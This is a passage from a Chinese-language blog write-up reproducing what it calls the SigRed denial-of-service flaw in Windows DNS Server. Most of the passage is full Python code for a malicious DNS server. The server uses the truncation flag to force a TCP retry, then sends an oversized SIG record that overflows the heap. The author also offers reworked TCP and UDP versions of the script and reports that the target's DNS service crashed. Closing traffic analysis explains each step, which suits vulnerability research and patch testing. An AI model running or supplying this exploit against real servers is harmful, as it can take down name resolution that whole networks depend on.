class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				data += connection.recv(<span class="number">65535</span>)</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line">			<span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">			connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">			connection.close()</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The UDP server is contacted first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_server</span>():</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">	server_address = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">	server_port = <span class="number">53</span></span><br><span class="line">	response = <span class="string">&quot;\x83\x80&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Queries</span></span><br><span class="line">	response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Data</span></span><br><span class="line">	data = <span class="string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="comment"># ns1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">	data += <span class="string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="comment"># ms1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">	data += <span class="string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="comment"># Serial Number</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="comment"># Refresh Interval</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="comment"># Response Interval</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x01\x51\x80&quot;</span> <span class="comment"># Expiration Limit</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># Minimum TTL</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Authoritative Nameservers</span></span><br><span class="line">	response += <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x06&quot;</span> <span class="comment"># Type: SOA</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">	response += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(data)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">	sock.bind((server_address, server_port))</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			recvd, client_address = sock.recvfrom(<span class="number">65535</span>)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Received UDP connection&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(recvd) &gt; <span class="number">2</span>:</span><br><span class="line">				sent = sock.sendto(recvd[:<span class="number">2</span>] + response + data, client_address)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">		exit()</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">	domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	setup()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Sets up two servers: one on UDP port 53 and one on TCP port 53</span></span><br><span class="line">	first = threading.Thread(target=udp_server)</span><br><span class="line">	second = threading.Thread(target=tcp_server)</span><br><span class="line"></span><br><span class="line">	first.start()</span><br><span class="line">	second.start()</span><br><span class="line"></span><br><span class="line">	first.join()</span><br><span class="line">	second.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    这个脚本的总的思路来说就是利用双线程运行了tcp_server与udp_server两个模块，两模块中其实耦合还是很强的，将消息内容硬编码到字符串中，然后发送给靶机。</p>
<p>​    然而其实双线程并不好用，所以我们来对脚本进行一个小修正，将其分为tcp和udp连接两个模块，同时启动，在ucp模块执行时，tcp等待：</p>
<p><strong>tcp_connect.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line">	<span class="keyword">global</span> domain_compressed</span><br><span class="line">	<span class="comment"># Setup</span></span><br><span class="line">	domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">	domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">	sock.listen(<span class="number">50</span>)</span><br><span class="line">	response = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			connection, client_address = sock.accept()</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">			data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># SIG Contents</span></span><br><span class="line">			sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">			sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">			sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">			sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">			sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">			sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">			sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">			sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">			sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># SIG Header</span></span><br><span class="line">			hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">			hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># DNS Header</span></span><br><span class="line">			response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				data += connection.recv(<span class="number">65535</span>)</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line">			<span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">			connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">			connection.close()</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">		exit()</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">	domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	setup()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finish_setup&#x27;</span>)</span><br><span class="line">    tcp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp_finish&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<p><strong>udp_connect.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line">	<span class="keyword">global</span> domain_compressed</span><br><span class="line">	<span class="comment"># Setup</span></span><br><span class="line">	domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">	domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># The UDP server is contacted first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_server</span>():</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">	server_address = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">	server_port = <span class="number">53</span></span><br><span class="line">	response = <span class="string">&quot;\x83\x80&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Queries</span></span><br><span class="line">	response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Data</span></span><br><span class="line">	data = <span class="string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="comment"># ns1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">	data += <span class="string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="comment"># ms1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">	data += <span class="string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="comment"># Serial Number</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="comment"># Refresh Interval</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="comment"># Response Interval</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x01\x51\x80&quot;</span> <span class="comment"># Expiration Limit</span></span><br><span class="line">	data += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># Minimum TTL</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Authoritative Nameservers</span></span><br><span class="line">	response += <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x06&quot;</span> <span class="comment"># Type: SOA</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">	response += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">	response += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(data)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">	sock.bind((server_address, server_port))</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			recvd, client_address = sock.recvfrom(<span class="number">65535</span>)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Received UDP connection&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(recvd) &gt; <span class="number">2</span>:</span><br><span class="line">				sent = sock.sendto(recvd[:<span class="number">2</span>] + response + data, client_address)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">	sock.listen(<span class="number">50</span>)</span><br><span class="line">	response = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp start listens&#x27;</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			connection, client_address = sock.accept()</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">			data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># SIG Contents</span></span><br><span class="line">			sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">			sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">			sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">			sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">			sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">			sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">			sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">			sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">			sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># SIG Header</span></span><br><span class="line">			hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">			hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># DNS Header</span></span><br><span class="line">			response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				data += connection.recv(<span class="number">65535</span>)</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line">			<span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">			connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">			connection.close()</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">		exit()</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">	domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	setup()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finish_setup&#x27;</span>)</span><br><span class="line">    udp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;udp_finish&#x27;</span>)</span><br><span class="line">    tcp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp_finish&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="三、POC执行"><a href="#三、POC执行" class="headerlink" title="三、POC执行"></a>三、POC执行</h3><p>运行脚本结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310162633329.png" alt="image-20220310162633329"></p>
<p>靶机上的dns服务被迫关闭了；</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310162741198.png" alt="image-20220310162741198"></p>
<p>攻击者这边显示收到了tcp和udp连接。</p>
<h2 id="0x06-流量分析"><a href="#0x06-流量分析" class="headerlink" title="0x06 流量分析"></a>0x06 流量分析</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310163153912.png" alt="image-20220310163153912"></p>
<p>抓包得到，编号98为我们发送的第一条数据包，这条数据包通过更改tc字段，申请建立tcp连接：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310163431476.png" alt="image-20220310163431476"></p>
<p>可以看到tcp三次握手的过程（上图中编号120开始）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310164244803.png" alt="image-20220310164244803"></p>
<p>在tcp消息中找到我们构造的tcp-sig包，图中圈出的c0 0c指向了前面的域名部分，构造了溢出。</p>
<p>​    整体的过程就是，由于win server2016本地无法解析“cve1350.com”，因此会以UDP协议向恶意服务器kali发送DNS查询，也就是kali收到的第一个UDP连接。<br>​    恶意服务就向受害者发送响应包，设置TC位，通知受害者采用TCP重发原来的查询请求，并允许返回的响应报文超过512个字节。这是第二个DNS包。<br>​    然后进行三次握手，受害者再次以TCP协议发送请求，这就是kali收到的TCP连接。之后，恶意服务器就可以利用TCP传输大于64KB的响应包发给受害者，触发漏洞，造成堆溢出。</p>
